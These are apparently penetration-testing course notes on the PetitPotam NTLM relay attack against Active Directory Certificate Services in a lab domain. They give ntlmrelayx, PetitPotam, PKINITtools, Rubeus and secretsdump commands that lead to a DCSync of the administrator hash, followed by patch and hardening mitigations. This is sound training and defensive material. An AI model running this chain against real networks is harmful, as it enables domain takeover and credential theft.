[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

For this attack to work we need to know what server is the Certificate Authority. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

Start ntlmrelayx
```shell
ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
Run [POC](https://github.com/topotam/PetitPotam) - There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)
```bash
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
python3 PetitPotam.py 172.16.5.225 172.16.5.5 
```
Requesting a TGT Using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) and base64 ticket from ntlmrelayx output
```shell
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
Setting the KRB5CCNAME Environment Variable
```bash
export KRB5CCNAME=dc01.ccache
```
Using Domain Controller TGT to DCSync
```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

klist
```

**Alternatively** this can be done with Rebeus on a Windows machine
```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

klist
```
DCSync via mimikatz
```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

### Mitigations
PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoftâ€™s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use.

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.
